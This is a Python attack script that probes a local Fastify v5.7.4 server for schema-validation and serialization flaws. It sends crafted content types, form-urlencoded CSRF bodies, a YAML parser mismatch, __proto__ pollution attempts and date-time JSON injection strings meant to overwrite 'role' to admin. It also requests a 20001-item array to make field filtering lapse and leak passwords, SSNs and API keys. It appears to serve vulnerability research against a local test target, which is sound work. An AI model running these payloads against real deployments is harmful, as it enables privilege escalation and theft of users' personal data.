#!/usr/bin/env python3
"""
Phase 2: Content-Type & Schema Validation Attacks
Target: Fastify v5.7.4 @ http://127.0.0.1:3000
Focus: Parser-validator mismatch, CSRF vectors, type coercion bypass
"""

import json
import time
import socket
import urllib.parse
import sys
import os

# Force unbuffered output
os.environ['PYTHONUNBUFFERED'] = '1'

import requests

BASE = 'http://127.0.0.1:3000'
EVIDENCE = {
    'phase': 2,
    'title': 'Content-Type & Schema Validation Attacks',
    'target': 'Fastify v5.7.4',
    'timestamp': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
    'tests': [],
    'findings': [],
    'anomalies': [],
}

test_count = 0
anomaly_count = 0

def log(msg):
    print(f"[*] {msg}", flush=True)

def log_ok(msg):
    print(f"[+] {msg}", flush=True)

def log_warn(msg):
    print(f"[!] {msg}", flush=True)

def log_finding(msg):
    print(f"[!!!] FINDING: {msg}", flush=True)

def add_test(name, category, result, details=None):
    global test_count
    test_count += 1
    entry = {
        'id': test_count,
        'name': name,
        'category': category,
        'result': result,
        'timestamp': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
    }
    if details:
        entry['details'] = details
    EVIDENCE['tests'].append(entry)

def add_anomaly(name, details):
    global anomaly_count
    anomaly_count += 1
    EVIDENCE['anomalies'].append({
        'id': anomaly_count,
        'name': name,
        'details': details,
    })

def raw_request(method, path, headers, body=None, timeout=5):
    """Send a raw HTTP request via socket for precise header control."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect(('127.0.0.1', 3000))

        req = f"{method} {path} HTTP/1.1\r\nHost: 127.0.0.1:3000\r\n"
        for k, v in headers.items():
            req += f"{k}: {v}\r\n"
        if body:
            if isinstance(body, str):
                body = body.encode()
            req += f"Content-Length: {len(body)}\r\n"
        req += "Connection: close\r\n\r\n"

        s.sendall(req.encode())
        if body:
            s.sendall(body)

        response = b''
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break

        s.close()

        # Parse response
        parts = response.split(b'\r\n\r\n', 1)
        head = parts[0].decode('utf-8', errors='replace')
        body_resp = parts[1] if len(parts) > 1 else b''

        status_line = head.split('\r\n')[0]
        status_code = int(status_line.split(' ')[1])

        return {
            'status': status_code,
            'headers': head,
            'body': body_resp.decode('utf-8', errors='replace'),
        }
    except Exception as e:
        return {'status': 0, 'error': str(e)}


# ==============================================================
# SECTION 1: Content-Type edge cases against schema-validated routes
# ==============================================================
def test_content_type_edge_cases():
    log("=" * 60)
    log("SECTION 1: Content-Type Edge Cases vs Schema Validation")
    log("=" * 60)

    valid_json = json.dumps({"username": "testuser", "email": "test@example.com", "role": "user"})

    # Test cases: (description, content-type, expected_behavior)
    edge_cases = [
        # Standard - should work
        ("Standard JSON", "application/json", 200),
        ("JSON with charset", "application/json; charset=utf-8", 200),
        ("JSON uppercase", "APPLICATION/JSON", 200),
        ("JSON mixed case", "Application/Json", 200),

        # Whitespace variations
        ("JSON trailing space", "application/json ", 200),
        ("JSON trailing tab", "application/json\t", 200),
        ("JSON trailing semicolon", "application/json;", 200),
        ("JSON space-semicolon", "application/json ;", 200),

        # Invalid subtypes (subtypeNameReg finding)
        ("JSON with parens", "application/json()", None),
        ("JSON with comma suffix", "application/json,text/plain", None),
        ("JSON with colon suffix", "application/json:evil", None),
        ("JSON with bracket suffix", "application/json[0]", None),
        ("JSON with brace suffix", "application/json{}", None),
        ("JSON with at suffix", "application/json@evil", None),
        ("JSON with quote suffix", 'application/json"evil', None),

        # CORS-simple types (CSRF vectors)
        ("Form-urlencoded (CSRF)", "application/x-www-form-urlencoded", None),
        ("Text plain (CSRF)", "text/plain", None),
        ("Multipart form", "multipart/form-data; boundary=----test", None),

        # Other parsers
        ("XML", "application/xml", None),
        ("YAML", "application/yaml", None),
        ("Catch-all octet", "application/octet-stream", None),

        # Double content-type in single header
        ("Double CT comma", "application/json, text/plain", None),
        ("Double CT semicolon", "text/plain; charset=application/json", None),

        # Empty/missing
        ("Empty content-type", "", None),
    ]

    for desc, ct, expected in edge_cases:
        try:
            if ct:
                resp = raw_request('POST', '/api/users', {'Content-Type': ct}, valid_json)
            else:
                resp = raw_request('POST', '/api/users', {}, valid_json)

            status = resp.get('status', 0)
            body_text = resp.get('body', '')

            # Parse response body if possible
            try:
                body_json = json.loads(body_text.split('\r\n')[-1] if '\r\n' in body_text else body_text)
            except:
                body_json = body_text

            result = 'pass' if (expected and status == expected) or (not expected) else 'unexpected'

            if status == 200 and expected != 200:
                log_warn(f"  {desc}: ACCEPTED (status={status}) - potential bypass!")
                add_anomaly(f"CT-EdgeCase-{desc}", {
                    'content_type': ct,
                    'status': status,
                    'body': str(body_json)[:200],
                })
            elif status == 200:
                log_ok(f"  {desc}: OK (status={status})")
            else:
                log(f"  {desc}: status={status}")

            add_test(f"CT-EdgeCase-{desc}", 'content-type', result, {
                'content_type': ct,
                'status': status,
                'response_preview': str(body_json)[:200],
            })

        except Exception as e:
            log(f"  {desc}: ERROR - {e}")
            add_test(f"CT-EdgeCase-{desc}", 'content-type', 'error', {'error': str(e)})


# ==============================================================
# SECTION 2: Form-urlencoded CSRF against JSON-schema routes
# ==============================================================
def test_csrf_form_bypass():
    log("")
    log("=" * 60)
    log("SECTION 2: Form-Urlencoded CSRF Against JSON Schema Routes")
    log("=" * 60)

    # Test 1: Basic form data to strict JSON schema route
    log("\n--- Test: Form data to /api/users (strict schema) ---")
    form_data = "username=csrfuser&email=csrf@evil.com&role=admin"
    resp = requests.post(f'{BASE}/api/users',
                        data=form_data,
                        headers={'Content-Type': 'application/x-www-form-urlencoded'})
    log(f"  Status: {resp.status_code}")
    if resp.status_code == 200:
        log_finding("Form-urlencoded body PASSED strict JSON schema validation!")
        body = resp.json()
        log(f"  Response: {json.dumps(body, indent=2)}")
        EVIDENCE['findings'].append({
            'id': 'P2-F01',
            'severity': 'MEDIUM',
            'title': 'CSRF: Form-urlencoded passes JSON schema on /api/users',
            'description': 'application/x-www-form-urlencoded body parsed by @fastify/formbody '
                         'produces flat object that passes JSON schema validation. Since form-urlencoded '
                         'is a CORS "simple" content-type, cross-origin form submissions can invoke '
                         'this route without CORS preflight.',
            'impact': 'Cross-site request forgery on schema-validated JSON routes',
            'cvss_estimate': '5.0',
            'evidence': {'request_ct': 'application/x-www-form-urlencoded', 'status': resp.status_code, 'response': body},
        })
    else:
        log(f"  Rejected: {resp.text[:200]}")
    add_test('CSRF-form-to-users', 'csrf', 'finding' if resp.status_code == 200 else 'blocked', {
        'status': resp.status_code,
    })

    # Test 2: Form data to /api/json-only (enum validation)
    log("\n--- Test: Form data to /api/json-only (action enum) ---")
    form_data2 = "action=delete&target=/etc/passwd"
    resp2 = requests.post(f'{BASE}/api/json-only',
                         data=form_data2,
                         headers={'Content-Type': 'application/x-www-form-urlencoded'})
    log(f"  Status: {resp2.status_code}")
    if resp2.status_code == 200:
        log_finding("Form-urlencoded body PASSED enum validation on /api/json-only!")
        body2 = resp2.json()
        log(f"  Response: {json.dumps(body2, indent=2)}")
        EVIDENCE['findings'].append({
            'id': 'P2-F02',
            'severity': 'MEDIUM',
            'title': 'CSRF: Form-urlencoded passes enum validation on /api/json-only',
            'description': 'application/x-www-form-urlencoded body with action=delete passes '
                         'enum schema validation. Attacker can submit a cross-origin form '
                         'to perform destructive actions.',
            'evidence': {'form_data': form_data2, 'status': resp2.status_code, 'response': body2},
        })
    else:
        log(f"  Rejected: {resp2.text[:200]}")
    add_test('CSRF-form-to-json-only', 'csrf', 'finding' if resp2.status_code == 200 else 'blocked', {
        'status': resp2.status_code,
    })

    # Test 3: Form data to /api/coerce (type coercion)
    log("\n--- Test: Form data to /api/coerce (type coercion) ---")
    form_data3 = "count=42&active=true&tags=a&tags=b"
    resp3 = requests.post(f'{BASE}/api/coerce',
                         data=form_data3,
                         headers={'Content-Type': 'application/x-www-form-urlencoded'})
    log(f"  Status: {resp3.status_code}")
    if resp3.status_code == 200:
        body3 = resp3.json()
        log(f"  Types received: {body3.get('types', {})}")
        # Check if string "42" was coerced to integer
        received = body3.get('received', {})
        if isinstance(received.get('count'), str):
            log_warn("  count remained string - type coercion difference from JSON!")
            add_anomaly('CSRF-coercion-mismatch', {
                'description': 'Form-urlencoded values are always strings; type coercion may behave differently',
                'received_types': body3.get('types', {}),
            })
    add_test('CSRF-form-to-coerce', 'csrf', str(resp3.status_code), {
        'status': resp3.status_code,
        'response_preview': resp3.text[:300],
    })

    # Test 4: Form data with array notation
    log("\n--- Test: Form data with bracket notation ---")
    form_data4 = "nested[value]=42"
    resp4 = requests.post(f'{BASE}/api/coerce',
                         data=form_data4,
                         headers={'Content-Type': 'application/x-www-form-urlencoded'})
    log(f"  Status: {resp4.status_code}")
    if resp4.status_code == 200:
        body4 = resp4.json()
        log(f"  Received: {body4.get('received', {})}")
        # fast-querystring doesn't support bracket notation - should be flat key
        received4 = body4.get('received', {})
        if 'nested[value]' in received4:
            log("  Confirmed: fast-querystring treats brackets as literal key")
        elif 'nested' in received4 and isinstance(received4['nested'], dict):
            log_warn("  Bracket notation creates nested objects! (qs-style)")
            add_anomaly('form-bracket-nesting', {'received': received4})
    add_test('CSRF-bracket-notation', 'csrf', str(resp4.status_code), {
        'status': resp4.status_code,
    })

    # Test 5: Form data __proto__ pollution attempt
    log("\n--- Test: Form data __proto__ pollution ---")
    form_data5 = "__proto__[polluted]=true&username=test&email=test@test.com"
    resp5 = requests.post(f'{BASE}/api/echo',
                         data=form_data5,
                         headers={'Content-Type': 'application/x-www-form-urlencoded'})
    log(f"  Status: {resp5.status_code}")
    if resp5.status_code == 200:
        body5 = resp5.json()
        keys = body5.get('keys', [])
        log(f"  Body keys: {keys}")
        if '__proto__[polluted]' in keys:
            log("  fast-querystring treats __proto__[polluted] as literal flat key (safe)")
        elif '__proto__' in keys:
            log_warn("  __proto__ appears as key in parsed body!")
            add_anomaly('form-proto-key', {'keys': keys})
    add_test('CSRF-form-proto-pollution', 'csrf', str(resp5.status_code), {
        'status': resp5.status_code,
    })


# ==============================================================
# SECTION 3: Content-Type mismatch - parser vs validator dispatch
# ==============================================================
def test_parser_validator_mismatch():
    log("")
    log("=" * 60)
    log("SECTION 3: Parser-Validator Mismatch Attacks")
    log("=" * 60)

    valid_json = json.dumps({"action": "read", "target": "test"})

    # Test: Send JSON body with text/plain Content-Type
    log("\n--- Test: JSON body with text/plain CT to /api/json-only ---")
    resp = requests.post(f'{BASE}/api/json-only',
                        data=valid_json,
                        headers={'Content-Type': 'text/plain'})
    log(f"  Status: {resp.status_code}")
    if resp.status_code == 200:
        log_finding("JSON body with text/plain CT passed schema validation!")
    else:
        log(f"  Rejected: {resp.text[:200]}")
    add_test('Mismatch-textplain-json-body', 'mismatch', str(resp.status_code), {
        'status': resp.status_code,
    })

    # Test: JSON body with application/xml CT
    log("\n--- Test: JSON body with application/xml CT to /api/json-only ---")
    resp2 = requests.post(f'{BASE}/api/json-only',
                         data=valid_json,
                         headers={'Content-Type': 'application/xml'})
    log(f"  Status: {resp2.status_code}")
    add_test('Mismatch-xml-ct-json-body', 'mismatch', str(resp2.status_code), {
        'status': resp2.status_code,
    })

    # Test: JSON body with application/yaml CT
    log("\n--- Test: JSON body with application/yaml CT to /api/json-only ---")
    resp3 = requests.post(f'{BASE}/api/json-only',
                         data="action: read\ntarget: test",
                         headers={'Content-Type': 'application/yaml'})
    log(f"  Status: {resp3.status_code}")
    if resp3.status_code == 200:
        log_finding("YAML body passed JSON schema validation on /api/json-only!")
        body3 = resp3.json()
        log(f"  Response: {json.dumps(body3, indent=2)}")
        EVIDENCE['findings'].append({
            'id': 'P2-F03',
            'severity': 'HIGH',
            'title': 'Schema bypass: YAML body passes JSON schema on /api/json-only',
            'description': 'YAML Content-Type body parsed by custom parser produces object that '
                         'passes JSON body schema validation. This bypasses the intent of schema '
                         'validation (which was designed for JSON bodies only).',
            'evidence': {'status': resp3.status_code, 'response': body3},
        })
    add_test('Mismatch-yaml-to-json-schema', 'mismatch', str(resp3.status_code), {
        'status': resp3.status_code,
    })

    # Test: Send via catch-all with made-up CT
    log("\n--- Test: JSON body with fake CT to /api/json-only ---")
    resp4 = raw_request('POST', '/api/json-only',
                       {'Content-Type': 'application/evil-type'},
                       valid_json)
    log(f"  Status: {resp4.get('status', 'error')}")
    add_test('Mismatch-fakect-json-body', 'mismatch', str(resp4.get('status', 0)), {
        'status': resp4.get('status', 0),
    })

    # Test: Schema validation bypass with unregistered CT that still has parser
    log("\n--- Test: text/plain body to /api/flexible (requires 'data' field) ---")
    resp5 = requests.post(f'{BASE}/api/flexible',
                         data="data=injected_value",
                         headers={'Content-Type': 'application/x-www-form-urlencoded'})
    log(f"  Status: {resp5.status_code}")
    if resp5.status_code == 200:
        body5 = resp5.json()
        log(f"  Body received: {body5.get('received', {})}")
        log_warn("  Form data passed 'required: [data]' schema check!")
    add_test('Mismatch-form-flexible', 'mismatch', str(resp5.status_code), {
        'status': resp5.status_code,
    })


# ==============================================================
# SECTION 4: Type coercion attacks via different parsers
# ==============================================================
def test_type_coercion():
    log("")
    log("=" * 60)
    log("SECTION 4: Type Coercion Attacks")
    log("=" * 60)

    # JSON type coercion with Fastify (ajv coercion)
    coercion_tests = [
        ("String as integer", {"count": "42", "active": true_val()} if False else {"count": "42"}),
        ("Float as integer", {"count": 3.14}),
        ("Boolean string", {"active": "true"}),
        ("Null as string", {"count": None}),
        ("Array as object", {"nested": [1, 2, 3]}),
        ("Numeric string overflow", {"count": "99999999999999999999"}),
        ("Negative zero", {"count": -0}),
        ("NaN string", {"count": "NaN"}),
        ("Infinity string", {"count": "Infinity"}),
        ("Hex string", {"count": "0xFF"}),
        ("Octal string", {"count": "0o77"}),
        ("Binary string", {"count": "0b1010"}),
        ("Scientific notation", {"count": "1e10"}),
        ("Empty string as int", {"count": ""}),
        ("Whitespace as int", {"count": "  "}),
    ]

    for desc, payload in coercion_tests:
        resp = requests.post(f'{BASE}/api/coerce',
                           json=payload,
                           headers={'Content-Type': 'application/json'})
        if resp.status_code == 200:
            body = resp.json()
            types = body.get('types', {})
            received = body.get('received', {})
            log(f"  {desc}: count={received.get('count', 'N/A')} (type: {types.get('count', 'N/A')})")
            if 'count' in types and types['count'] not in ('number', 'undefined'):
                add_anomaly(f'coercion-{desc}', {'received': received, 'types': types})
        else:
            log(f"  {desc}: rejected ({resp.status_code})")
        add_test(f'Coercion-{desc}', 'coercion', str(resp.status_code), {
            'payload': payload,
            'status': resp.status_code,
        })

    # Test additionalProperties bypass via coercion
    log("\n--- Test: Extra properties through coercion schema ---")
    resp = requests.post(f'{BASE}/api/coerce',
                        json={"count": 1, "isAdmin": True, "role": "admin", "__proto__": {"x": 1}})
    if resp.status_code == 200:
        body = resp.json()
        log(f"  Extra props in response: {list(body.get('received', {}).keys())}")
        # Coercion schema doesn't have additionalProperties: false, so extras pass through
    add_test('Coercion-extra-props', 'coercion', str(resp.status_code))


def true_val():
    return True


# ==============================================================
# SECTION 5: Schema validation bypass via catch-all parser
# ==============================================================
def test_catchall_schema_bypass():
    log("")
    log("=" * 60)
    log("SECTION 5: Catch-All Parser + Schema Validation")
    log("=" * 60)

    valid_json = json.dumps({"username": "test", "email": "test@test.com", "role": "user"})

    # With catch-all parser registered, send body with unknown CT
    unknown_cts = [
        'application/x-custom',
        'text/csv',
        'application/msgpack',
        'image/png',
        'video/mp4',
    ]

    for ct in unknown_cts:
        resp = requests.post(f'{BASE}/api/echo',
                           data=valid_json,
                           headers={'Content-Type': ct})
        log(f"  CT={ct}: status={resp.status_code}")
        if resp.status_code == 200:
            body = resp.json()
            body_parsed = body.get('body', {})
            log(f"    Body type: {body.get('bodyType')}")
            # With catch-all, body is base64 buffer
            if body_parsed.get('type') == 'raw':
                log(f"    Parsed as raw/base64: {str(body_parsed.get('raw', ''))[:60]}...")
        add_test(f'Catchall-{ct}', 'catchall', str(resp.status_code), {
            'ct': ct,
            'status': resp.status_code,
        })

    # Now test if catch-all bypasses schema on /api/users
    log("\n--- Test: Unknown CT with valid JSON body to /api/users ---")
    resp = requests.post(f'{BASE}/api/users',
                        data=valid_json,
                        headers={'Content-Type': 'application/x-custom'})
    log(f"  Status: {resp.status_code}")
    if resp.status_code == 200:
        log_finding("Unknown CT bypassed schema validation on /api/users!")
    else:
        log(f"  Rejected: {resp.text[:200]}")
    add_test('Catchall-schema-bypass-users', 'catchall', str(resp.status_code))


# ==============================================================
# SECTION 6: Serialization attacks (fast-json-stringify)
# ==============================================================
def test_serialization_attacks():
    log("")
    log("=" * 60)
    log("SECTION 6: Serialization Attacks (fast-json-stringify)")
    log("=" * 60)

    # Test 1: Response schema filters password/_secret
    log("\n--- Test: Response schema filtering on /api/user-safe ---")
    resp = requests.get(f'{BASE}/api/user-safe')
    if resp.status_code == 200:
        body = resp.json()
        has_password = 'password' in body
        has_secret = '_secret' in body
        has_internal = '_internal_token' in body
        log(f"  password present: {has_password}")
        log(f"  _secret present: {has_secret}")
        if has_password or has_secret:
            log_finding("Response schema filtering FAILED - sensitive data leaked!")
            EVIDENCE['findings'].append({
                'id': 'P2-F-SERIAL-01',
                'severity': 'HIGH',
                'title': 'Response schema fails to filter sensitive fields',
                'evidence': body,
            })
        else:
            log_ok("  Response schema correctly filters password and _secret")
    add_test('Serial-user-safe-filtering', 'serialization', 'pass' if not (has_password or has_secret) else 'fail')

    # Test 2: Nested response filtering
    log("\n--- Test: Nested response filtering on /api/nested ---")
    resp2 = requests.get(f'{BASE}/api/nested')
    if resp2.status_code == 200:
        body2 = resp2.json()
        user = body2.get('user', {})
        meta = body2.get('meta', {})
        has_role = 'role' in user
        has_ssn = 'ssn' in user
        has_total = 'totalRecords' in meta
        has_dbhost = 'dbHost' in meta
        has_internal = '_internal' in body2
        log(f"  user.role present: {has_role}, user.ssn present: {has_ssn}")
        log(f"  meta.totalRecords present: {has_total}, meta.dbHost present: {has_dbhost}")
        log(f"  _internal present: {has_internal}")
        if has_ssn or has_dbhost or has_internal:
            log_warn("  Some fields leaked through nested schema!")
        else:
            log_ok("  Nested schema correctly filters extra fields")
    add_test('Serial-nested-filtering', 'serialization', str(resp2.status_code))

    # Test 3: Date-time JSON injection
    log("\n--- Test: Date-time JSON injection on /api/event ---")
    # Try injecting JSON via the startDate parameter
    injection_payloads = [
        # Basic quote injection
        '2026-01-01","role":"admin","x":"',
        # Try to overwrite role field (last-value-wins in parsers)
        '2026-01-01T00:00:00Z","role":"admin","startDate":"2026-01-01',
        # Backslash escape attempt
        '2026-01-01\\","role":"admin"}///',
    ]

    for payload in injection_payloads:
        resp3 = requests.get(f'{BASE}/api/event', params={'startDate': payload})
        if resp3.status_code == 200:
            raw_text = resp3.text
            log(f"  Payload: {payload[:50]}...")
            log(f"  Raw response: {raw_text[:200]}")

            # Check if the injection altered the JSON structure
            try:
                parsed = json.loads(raw_text)
                if parsed.get('role') == 'admin':
                    log_finding("Date-time JSON injection SUCCEEDED - role overwritten to admin!")
                    EVIDENCE['findings'].append({
                        'id': 'P2-F04',
                        'severity': 'HIGH',
                        'title': 'fast-json-stringify: JSON injection via format:date-time',
                        'description': 'String value passed to format:date-time schema field is wrapped '
                                     'in double quotes without escaping. Attacker-controlled date strings '
                                     'can break out of the JSON string and inject arbitrary properties.',
                        'cvss_estimate': '7.5',
                        'evidence': {
                            'payload': payload,
                            'raw_response': raw_text,
                            'parsed_role': parsed.get('role'),
                        },
                    })
                else:
                    log(f"    Parsed OK, role={parsed.get('role')}")
            except json.JSONDecodeError as e:
                log_warn(f"    JSON parse error: {e}")
                log(f"    Raw: {raw_text[:300]}")
                add_anomaly('datetime-injection-malformed', {
                    'payload': payload,
                    'error': str(e),
                    'raw_response': raw_text[:500],
                })
        add_test(f'Serial-datetime-inject-{payload[:30]}', 'serialization', str(resp3.status_code))

    # Test 4: Empty schema data leak
    log("\n--- Test: Empty schema data leak on /api/profile ---")
    resp4 = requests.get(f'{BASE}/api/profile')
    if resp4.status_code == 200:
        body4 = resp4.json()
        prefs = body4.get('preferences', {})
        has_password = 'password' in body4
        has_internal_notes = 'internal_notes' in prefs
        has_api_token = 'api_token' in prefs
        log(f"  preferences.internal_notes present: {has_internal_notes}")
        log(f"  preferences.api_token present: {has_api_token}")
        log(f"  top-level password present: {has_password}")
        if has_internal_notes or has_api_token:
            log_finding("Empty schema {} leaks ALL nested data!")
            EVIDENCE['findings'].append({
                'id': 'P2-F05',
                'severity': 'MEDIUM',
                'title': 'fast-json-stringify: Empty schema {} leaks all nested data',
                'description': 'Properties with empty schema {} fall through to JSON.stringify(), '
                             'serializing the entire value with all nested properties. Sensitive data '
                             'like internal_notes, api_token, manager_email are leaked.',
                'evidence': {
                    'preferences_leaked': prefs,
                    'password_filtered': not has_password,
                },
            })
        if not has_password:
            log_ok("  top-level password correctly filtered by schema")
    add_test('Serial-empty-schema-leak', 'serialization', str(resp4.status_code))

    # Test 5: Large array mechanism bypass
    log("\n--- Test: Large array serialization on /api/users-list ---")
    # First test small array - schema should filter
    resp5a = requests.get(f'{BASE}/api/users-list?count=5')
    if resp5a.status_code == 200:
        body5a = resp5a.json()
        users5a = body5a.get('users', [])
        if users5a:
            first = users5a[0]
            has_pw = 'password' in first
            has_ssn = 'ssn' in first
            has_key = 'apiKey' in first
            log(f"  Small array (5 items): password={has_pw}, ssn={has_ssn}, apiKey={has_key}")
            if has_pw or has_ssn or has_key:
                log_warn("  Even small array leaks sensitive data!")
            else:
                log_ok("  Small array correctly filtered")
    add_test('Serial-small-array', 'serialization', str(resp5a.status_code))

    # Test with 20001+ items to trigger largeArrayMechanism
    log("\n  Testing large array (20001 items) - this may take a moment...")
    try:
        resp5b = requests.get(f'{BASE}/api/users-list?count=20001', timeout=30)
        if resp5b.status_code == 200:
            body5b = resp5b.json()
            users5b = body5b.get('users', [])
            if len(users5b) > 20000:
                # Check an item past the threshold
                last = users5b[-1]
                has_pw = 'password' in last
                has_ssn = 'ssn' in last
                has_key = 'apiKey' in last
                log(f"  Large array ({len(users5b)} items): password={has_pw}, ssn={has_ssn}, apiKey={has_key}")
                if has_pw or has_ssn or has_key:
                    log_finding("largeArrayMechanism BYPASS - JSON.stringify() leaked all fields!")
                    EVIDENCE['findings'].append({
                        'id': 'P2-F06',
                        'severity': 'HIGH',
                        'title': 'fast-json-stringify: largeArrayMechanism bypasses schema filtering',
                        'description': 'When array size exceeds largeArraySize (default 20000) and '
                                     'largeArrayMechanism is "json-stringify", the library falls back to '
                                     'JSON.stringify() for the entire array, completely bypassing schema '
                                     'property filtering. All passwords, SSNs, API keys are leaked.',
                        'cvss_estimate': '7.0',
                        'evidence': {
                            'total_items': len(users5b),
                            'last_item_keys': list(last.keys()),
                            'sample_leaked': {k: str(v)[:20] for k, v in last.items()},
                        },
                    })
                else:
                    log_ok("  Large array correctly filtered (largeArrayMechanism may be 'default')")
            else:
                log(f"  Got {len(users5b)} items (expected 20001)")
    except requests.exceptions.Timeout:
        log_warn("  Timeout on large array request")
        add_anomaly('large-array-timeout', {'count': 20001})
    except Exception as e:
        log(f"  Error: {e}")
    add_test('Serial-large-array', 'serialization', 'tested')

    # Test 6: Response schema with __proto__ in return value
    log("\n--- Test: __proto__ in serialized response ---")
    resp6 = requests.get(f'{BASE}/api/user-safe')
    if resp6.status_code == 200:
        raw = resp6.text
        if '__proto__' in raw:
            log_warn("  __proto__ appears in serialized response!")
            add_anomaly('proto-in-response', {'raw_response': raw[:300]})
        else:
            log_ok("  __proto__ correctly stripped from response")
    add_test('Serial-proto-in-response', 'serialization', str(resp6.status_code))


# ==============================================================
# SECTION 7: additionalProperties bypass attempts
# ==============================================================
def test_additional_properties():
    log("")
    log("=" * 60)
    log("SECTION 7: additionalProperties Bypass Attempts")
    log("=" * 60)

    # /api/users has additionalProperties: false
    extra_props_tests = [
        ("Extra isAdmin", {"username": "test", "email": "t@t.com", "isAdmin": True}),
        ("Extra role override", {"username": "test", "email": "t@t.com", "role": "admin", "role2": "superadmin"}),
        ("Unicode key", {"username": "test", "email": "t@t.com", "\u200bisAdmin": True}),
        ("Null byte key", {"username": "test", "email": "t@t.com", "is\x00Admin": True}),
        ("Dot notation", {"username": "test", "email": "t@t.com", "nested.key": "value"}),
        ("Empty string key", {"username": "test", "email": "t@t.com", "": "value"}),
    ]

    for desc, payload in extra_props_tests:
        resp = requests.post(f'{BASE}/api/users',
                           json=payload,
                           headers={'Content-Type': 'application/json'})
        log(f"  {desc}: status={resp.status_code}")
        if resp.status_code == 200:
            log_warn(f"    Accepted with extra properties! Response: {resp.text[:200]}")
            add_anomaly(f'addlprops-{desc}', {
                'payload': payload,
                'status': resp.status_code,
            })
        add_test(f'AdditionalProps-{desc}', 'schema-bypass', str(resp.status_code))


# ==============================================================
# MAIN
# ==============================================================
def main():
    log(f"Phase 2 Attack Script - Fastify v5.7.4")
    log(f"Target: {BASE}")
    log(f"Started: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    log("")

    # Verify server is up
    try:
        r = requests.get(f'{BASE}/health', timeout=3)
        health = r.json()
        log(f"Server: Fastify {health['version']} (Node {health['nodeVersion']})")
    except Exception as e:
        log(f"ERROR: Server not reachable - {e}")
        sys.exit(1)

    test_content_type_edge_cases()
    test_csrf_form_bypass()
    test_parser_validator_mismatch()
    test_type_coercion()
    test_catchall_schema_bypass()
    test_serialization_attacks()
    test_additional_properties()

    # Summary
    log("")
    log("=" * 60)
    log(f"PHASE 2 COMPLETE")
    log(f"Total tests: {test_count}")
    log(f"Findings: {len(EVIDENCE['findings'])}")
    log(f"Anomalies: {anomaly_count}")
    log("=" * 60)

    EVIDENCE['total_tests'] = test_count
    EVIDENCE['total_findings'] = len(EVIDENCE['findings'])
    EVIDENCE['total_anomalies'] = anomaly_count

    # Save evidence
    evidence_path = '/home/[REDACTED]/Desktop/[REDACTED-PATH]/Fastify/evidence/phase2_content_type.json'
    with open(evidence_path, 'w') as f:
        json.dump(EVIDENCE, f, indent=2, default=str)
    log(f"Evidence saved to: {evidence_path}")


if __name__ == '__main__':
    main()
